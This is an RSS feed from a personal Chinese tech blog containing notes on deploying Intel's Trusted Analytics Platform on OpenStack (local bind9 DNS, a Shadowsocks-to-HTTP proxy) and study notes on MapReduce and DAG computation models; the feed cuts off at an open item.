<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Yinan&#39;s Blog</title>
    <description>Welcome to geek&#39;s world!</description>
    <link>https://wuyinan0126.github.io//</link>
    <atom:link href="https://wuyinan0126.github.io//feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Thu, 09 Mar 2017 15:51:27 +0800</pubDate>
    <lastBuildDate>Thu, 09 Mar 2017 15:51:27 +0800</lastBuildDate>
    <generator>Jekyll v3.0.2</generator>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; TAP平台搭建和使用笔记</title>
        <description>&lt;p&gt;&lt;em&gt;在OpenStack上搭建和使用Trusted Analytics Platform，包括OpenStack的搭建、本地DNS服务的搭建、本地代理服务器的搭建、疑难问题的筛查和解决&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;tap&quot;&gt;TAP平台&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;TAP是由Intel开发的一款开源软件，它可以加速创建以大数据分析为驱动的本地云应用。它通过在公有云和私有云提供一个分享的、灵活的数据分析环境，使得企业的开发者、数据科学家、云服务提供商和系统集成商更容易地合作&lt;/p&gt;

&lt;p&gt;TAP是一个多租户的平台，旨在简化和加速端到端的分析应用程序的交付。它采用松耦合的分层架构，使得在定制解决方式时具有较大的灵活性。它由数据层(Data Layer)、分析层(Analytics Layer)和应用层(Application Layer)构成，如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2017-03-09-1.png&quot; alt=&quot;TAP架构图&quot; title=&quot;TAP架构图&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;openstack&quot;&gt;OpenStack搭建&lt;/h2&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;TAP的OpenStack版本要求：Mirantis Opentack 7.0 for Kilo 2015.1.0&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;TAP的硬件要求：
    &lt;ul&gt;
      &lt;li&gt;1个fuel server: 4核CPU，4GB内存，1 Gbps以太网，128GB SAS硬盘&lt;/li&gt;
      &lt;li&gt;1个Controller节点: 2个6核CPU，24GB内存，1TB RAID1&lt;/li&gt;
      &lt;li&gt;1个Storage节点: 1个4核CPU，12GB内存，500GB RAID1&lt;/li&gt;
      &lt;li&gt;6个Compute节点（每个）:双socket CPU，每个socket至少4核，64GB内存，256GB SSD&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;实际硬件：
    &lt;ul&gt;
      &lt;li&gt;1个fuel server: 双网口，网口1配置VLAN&lt;/li&gt;
      &lt;li&gt;1个Controller + Cinder Storage节点：双网口，网口1配置VLAN，2个8核CPU，48GB内存，900GB？？？&lt;/li&gt;
      &lt;li&gt;4个Compute + Cinder Storage节点（每个）：双网口，网口1配置VLAN，4个16核CPU，128G内存，0.8~3.6TB？？？&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;网络配置：
    &lt;ul&gt;
      &lt;li&gt;公开：
        &lt;ul&gt;
          &lt;li&gt;IP范围：10.2.14.3～10.2.14.21&lt;/li&gt;
          &lt;li&gt;CIDR：10.2.14.0/24&lt;/li&gt;
          &lt;li&gt;不使用VLAN标记&lt;/li&gt;
          &lt;li&gt;网关：10.2.14.1&lt;/li&gt;
          &lt;li&gt;Floating IP范围：10.2.14.22～10.2.14.79&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;存储：
        &lt;ul&gt;
          &lt;li&gt;VLAN：991&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;管理：
        &lt;ul&gt;
          &lt;li&gt;VLAN：992&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Neutron L2配置：
        &lt;ul&gt;
          &lt;li&gt;VLAN ID 范围：993～999&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;OpenStack配置：
    &lt;ul&gt;
      &lt;li&gt;Repositories：修改ubuntu的软件源（如阿里云的源）：http://mirrors.aliyun.com/ubuntu/&lt;/li&gt;
      &lt;li&gt;Public network assignment：给所有节点分配所有public网络&lt;/li&gt;
      &lt;li&gt;Storage：Cinder LVM over iSCSI for volumes&lt;/li&gt;
      &lt;li&gt;Public TLS：不使用HTTPS和TLS&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;dns&quot;&gt;本地DNS服务的搭建&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;由于TAP平台需要TAP Domain，之前使用xip.io不稳定且解析速度慢，因此搭建本地DNS服务器（IP为10.2.3.114）。我的TAP Domain为tap.wyn，需要将所有子域名解析为10.2.14.28&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;建立Ubuntu Server虚拟机&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;安装bind9：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sudo apt-get install bind9
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;添加一个zone：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sudo cp /etc/bind/db.local /etc/bind/db.tap.wyn
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改/etc/bind/named.conf.local：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; zone &quot;tap.wyn&quot; {
   type master;
   file &quot;/etc/bind/db.tap.wyn&quot;;
 };
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改/etc/bind/db.tap.wyn：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $TTL    604800
 @       IN      SOA     tap.wyn. root.tap.wyn. (
                               2         ; Serial
                          604800         ; Refresh
                           86400         ; Retry
                         2419200         ; Expire
                          604800 )       ; Negative Cache TTL
 ;
 @       IN      NS      10.2.3.114.		# 替换为你的本地dns服务器（即本机）地址
 @       IN      A       10.2.14.28		# 使其能解析tap.wyn为10.2.14.28
 *       IN      A       10.2.14.28		# 使其能解析*.tap.wyn为10.2.14.28
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改/etc/bind/named.conf.options：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; options {
         directory &quot;/var/cache/bind&quot;;
         forwarders {				# 当本地解析不了时，转发给一下DNS服务器解析
                 202.112.128.51;
                 114.114.114.114;
                 0.0.0.0;
         };
         dnssec-validation auto;
         auth-nxdomain no;    
         listen-on-v6 { any; };
         allow-query { any; };			# 允许任何主机用该DNS服务器查询
 };
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;编写开机启动脚本：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; sudo /etc/init.d/bind9 restart
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;测试：
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;修改本机/etc/resolv.conf，在所有nameserver上加入：&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  nameserver 10.2.3.114				# 替换为你的本地dns服务器（即本机）地址
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;测试：&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ host tap.wyn
  $ host a.tap.wyn
  $ host baidu.com
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;section&quot;&gt;本地代理服务的搭建&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;由于TAP平台需要从国外软件源下载依赖包，并且TAP平台只支持HTTP和HTTPS代理。目前国内的代理提供商已经不提供HTTP代理，因为其流量能被监视，因此需要将其他代理协议，如ShadowSocks，转为HTTP代理，因此搭建本地代理服务器（IP为10.2.3.111）&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;建立Ubuntu Server虚拟机&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;安装shadowsocks：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sudo pip install shadowsocks
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;新建配置文件/etc/shadowsocks.json，配置参数可以从&lt;a href=&quot;https://portal.shadowsocks.com.hk/&quot;&gt;https://portal.shadowsocks.com.hk/&lt;/a&gt;网站购买：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;		
   &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;server&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;{your-server}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;server_port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;your-port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;local_port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1080&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;{your-password}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;method&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;aes-256-cfb&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;配置全局代理。安装polipo：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sudo apt-get install polipo
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改配置文件/etc/polipo/config：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; logSyslog = true
 logFile = /var/log/polipo/polipo.log
 proxyAddress = &quot;0.0.0.0&quot;
 socksParentProxy = &quot;127.0.0.1:1080&quot;
 socksProxyType = socks5
 allowedPorts = 1-65535
 tunnelAllowedPorts = 1-65535
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;编写开机启动脚本：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; sudo sslocal -c /etc/shadowsocks.json -d restart
 sudo /etc/init.d/polipo restart
 export http_proxy=http://127.0.0.1:8123/
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;测试：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sudo http_proxy=http://127.0.0.1:8123 curl www.t66y.com # 小孩子不要打开这个网址
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;tap-1&quot;&gt;TAP平台搭建&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;按照&lt;a href=&quot;https://github.com/trustedanalytics/platform-wiki-0.7/wiki/0.7-Openstack-Platform-Deployment&quot;&gt;https://github.com/trustedanalytics/platform-wiki-0.7/wiki/0.7-Openstack-Platform-Deployment&lt;/a&gt;步骤搭建，我选择的配置文件是TAP-FullVM.yaml&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;section-1&quot;&gt;查看安装日志&lt;/h3&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;使用Key Pair登录JumpBox，在本机：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ ssh ubuntu@&amp;lt;jumpbox_server_ip&amp;gt; -i &amp;lt;你配置文件中选择的key pair&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;从JumpBox登录Nignx，在JumpBox中：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ sudo -i
  # ssh ubuntu@&amp;lt;nignx_server_ip&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;查看安装日志/var/log/cloud-init-output.log、/var/log/ansible.log&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

</description>
        <pubDate>Thu, 09 Mar 2017 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io//2017/TAP%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io//2017/TAP%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</guid>
        
        <category>原创</category>
        
        <category>大数据</category>
        
        
        <category>原创</category>
        
        <category>大数据</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 大数据学习笔记(4)-分布式文件系统</title>
        <description>&lt;p&gt;&lt;em&gt;深入学习GFS、HDFS的…等&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;gfs&quot;&gt;GFS&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2016-12-04-1.png&quot; alt=&quot;Hadoop的MapReduce运行机制&quot; title=&quot;Hadoop的MapReduce运行机制&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;未完待续&lt;/strong&gt;&lt;/p&gt;

</description>
        <pubDate>Tue, 06 Dec 2016 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io//2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(4)-%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io//2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(4)-%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</guid>
        
        <category>原创</category>
        
        <category>大数据</category>
        
        
        <category>原创</category>
        
        <category>大数据</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 大数据学习笔记(3)-计算模型</title>
        <description>&lt;p&gt;&lt;em&gt;深入学习MapReduce、DAG计算模型，介绍了MapReduce计算模型的运行机制、优点和不足、计算模式，和一种更高效的的计算框架——DAG模型的图结构描述&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;mapreduce&quot;&gt;MapReduce&lt;/h2&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;mapreduce-1&quot;&gt;MapReduce运行机制&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2016-12-04-1.png&quot; alt=&quot;Hadoop的MapReduce运行机制&quot; title=&quot;Hadoop的MapReduce运行机制&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;MapReduce计算框架将应用的输入数据分割成若干block（自Hadoop-2.2起，默认为128M），存入HDFS&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;集群中的Master负责为Worker分配Map或Reduce任务，并做一些全局管理；任务数可由开发者指定&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Map阶段：被分配到Map任务的Worker读取对应的block，从block中解析出Key/Value对，并传递给Map函数，执行业务逻辑，将中间结果Key/Value对缓存在内存中&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Patition阶段：缓存的中间结果会周期性地被Spill入&lt;strong&gt;本地磁盘&lt;/strong&gt;，写入磁盘前被Partitioner分割为R份，R为Reduce任务数，分割函数一般是用Key对R哈希取模。在分割后将R个临时文件位置通知给Master，Master将其转交给Reduce任务的Worker&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Sort&amp;amp;Combine阶段：在写入磁盘前，对中间结果进行&lt;strong&gt;局部&lt;/strong&gt;排序，然后运行Combiner对数据进行合并，即对中间数据中具有相同Key的Value值进行合并，合并的业务逻辑和Reduce阶段的逻辑是相似的，这样可以大大减少中间数据量，减少网络传输量&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Shuffle阶段：当某个Reduce任务的Worker接收到Master的通知后，其通过RPC(Remote Procedure Call)将Map任务产生的属于自己的M份临时文件&lt;strong&gt;Pull&lt;/strong&gt;到本地，M为Map任务数。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Reduce阶段：将M分临时文件中局部Key有序的数据进行Merge Sort进行全局排序，然后执行Reduce函数，并将结果追加到这个Reduce任务对应的结果文件结尾&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;mapreduce-2&quot;&gt;MapReduce优点和不足&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;优点：&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;极强的可扩展性、良好的容错性、简单性（即用户只要完成Map和Reduce函数即可）&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;数据的高吞吐量、支持海量数据处理的大规模并行处理、细粒度容错&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;不足：&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;不适合对实效性要求高的应用场景（如交互式查询、流式计算）&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;不适合迭代运算类的机器学习及数据挖掘类的应用&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;不足的原因：&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;Map和Reduce任务启动时间较长。对于批处理任务来说，启动时间对于任务执行时间所占比例不大，但对于高实效性的应用来说，所占比例太高&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;在一次任务执行过程中，MapReduce计算模型存在多处的磁盘读写、网络传输的过程。如初始block读取、Map任务的中间结果保存入磁盘、Shuffle阶段的网络传输、Reduce阶段的磁盘读和HDFS写等。对于迭代式机器学习应用，往往需要一个任务反复迭代进行，此时磁盘读写、网络传输的开销造成效率低下&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;mapreduce-3&quot;&gt;MapReduce计算模式&lt;/h3&gt;

&lt;p&gt;实际应用中的大部分ETL任务都可以归结为MapReduce计算模式或其变体，如：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;求和模式：包括数值求和（Value为数值），记录求和（Value为非数值，累加形成队列）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;过滤模式：简单过滤（Map实现过滤函数，无Reduce阶段），Top K记录（Map实现统计局部Top K，Reduce实现全局Top K）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;组织数据模式：&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;数据分片：例如将所有记录按日期进行分类，需要将同一时间的数据放到一起，此时需要修改Partion策略，默认的Partition策略为hash取模&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;全局排序：MapReduce自带的排序特性，在Reduce阶段需要先将中间数据按Key进行Merge Sort，因此只需要修改Partion策略，保证不同的Reducer处理一个区间范围的记录，例如将Key为1-1000的数据给Reducer1处理，key为1001-2000点数据交给Reducer2处理，这样将所有Reducer的输出拼接在一起即可得到全局排序&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Join模式：&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;Reduce-Side Join：需要输入两个数据集，区分方式为：连表的外键作为Key，记录的其他内容作为Value，在Value中增加一个标志信息，表明记录属于哪个数据集。然后在Reduce阶段将相同Key，不同数据集的记录做Join。该方式较通用，但需要经过若干轮中间数据的磁盘读写、Shuffle阶段的网络传输、Reduce阶段的排序等耗时的操作，因此计算效率较低&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;Map-Side Join：只需要输入一个大数据集，小数据集放入内存哈希表中，以外键作为哈希表的Key。此时只需要在Map阶段对大数据的每条记录查找哈希表进行Join操作。由于避免了Shuffle阶段的网络传输、Reduce阶段的排序等耗时的操作，因此该方式效率较高，但要求小数据集必须足够小到能放入内存&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;dag&quot;&gt;一种更高效的的计算框架——DAG&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;虽然MapReduce提供了简介的借口，用户只需完成Map和Reduce函数的业务逻辑就可以实现大规模数据批处理任务，但是其支持的运算符仅仅限定与Map和Reduce两类，所以在表达能力上不够丰富。&lt;/p&gt;

&lt;p&gt;另外，MapReduce计算模型的本质是由Map和Reduce序列两个阶段完成的，在Map任务阶段有个任务同步过程，只有在所有Map任务执行完成才能开始Reduce阶段的任务。&lt;/p&gt;

&lt;p&gt;从上可以看出MapReduce对于子任务之间复杂的交互和依赖关系缺乏表达能力，因此，一种更高效的的计算框架——DAG氤氲而生。DAG计算模型可以认为是对MapReduce计算模型的一种扩展（可以将MapReduce模型看作DAG模型的一种特例）。DAG模型可以表达复杂的并发任务之间的依赖关系，提供了丰富的运算符，使其表达能力和灵活性更加强大。&lt;/p&gt;

&lt;p&gt;DAG的全称是”Directed Acyclic Graph”(有向无环图)，是指将计算任务分解成若干子任务，这些子任务之间由逻辑关系或运行先后顺序等因素被构建成有向无环图结构。&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;dag-1&quot;&gt;DAG图结构描述&lt;/h3&gt;

&lt;p&gt;以微软的Dryad为例，其采用了若干简单的DAG结构及其描述符的不断组合来构建复杂结构的方式。可以形式化地用以下方式描述一个DAG图结构：&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;G=\{ {V}_{G},{E}_{G},{I}_{G},{O}_{G} \}&lt;/script&gt;

&lt;p&gt;其中，VG代表图节点集合，EG代表有向边集合；IG是VG的子集，表示DAG图中的数据输入节点集合；OG也是VG的子集，表示DAG图中数据输出节点集合。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;一个基本的图描述符为G^k，表示一个计算结构并发为k个，如下图：&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2016-12-04-2.png&quot; alt=&quot;A^n&quot; title=&quot;A^n&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;图结构串行连接G3 = G1 · G2，由图G1和图G2的所有节点和边构成，图G1的输入节点构成图G3的输入节点，图G2的输出节点构成图G3的输出节点，图G1的输出节点到图G2的输入节点之间构建新的有向边。这种关系可以定义下列两个描述符：&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;G1 &amp;gt;= G2：图G1的输出节点和图G2的输入节点间进行点对点的边连接，采用Round Robin(轮询)的方式构建有向边：
        &lt;ul&gt;
          &lt;li&gt;如果|OG1|&amp;gt;=|IG2|，此时G2的输入节点中某些节点输入边可能大于1条&lt;/li&gt;
          &lt;li&gt;如果|OG1|&amp;lt;|IG2|，此时G2的输入节点中有些节点没有输入边&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;G1 » G2: 图G1的输出节点和图G2的输入节点之间形成完全二分图。**MapReduce架构即为由并发执行的Map阶段的图G1和Reduce阶段的图G2串行而成的完全二分图，如下图：&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/2016-12-04-3.png&quot; alt=&quot;AS &amp;gt;&amp;gt; BS&quot; title=&quot;AS &amp;gt;&amp;gt; BS&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;G1 || G2：代表图结构水平融合，允许图G1和图G2有相同的节点，融合时合并相同节点，如下图，是由图B &amp;gt;= C和图B &amp;gt;= D水平融合得到的：&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2016-12-04-4.png&quot; alt=&quot;B &amp;gt;= C || B &amp;gt;= D&quot; title=&quot;B &amp;gt;= C \|\| B &amp;gt;= D&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;通过以上几个基础的描述符，可以构建复杂的图结构，如下图：&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2016-12-04-5.png&quot; alt=&quot;复杂图结构&quot; title=&quot;复杂图结构&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;dag-2&quot;&gt;DAG图任务执行&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;未完待续&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 04 Dec 2016 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io//2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(3)-%E8%AE%A1%E7%AE%97%E6%A8%A1%E5%9E%8B/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io//2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(3)-%E8%AE%A1%E7%AE%97%E6%A8%A1%E5%9E%8B/</guid>
        
        <category>原创</category>
        
        <category>大数据</category>
        
        
        <category>原创</category>
        
        <category>大数据</category>
        
      </item>
    
      <item>
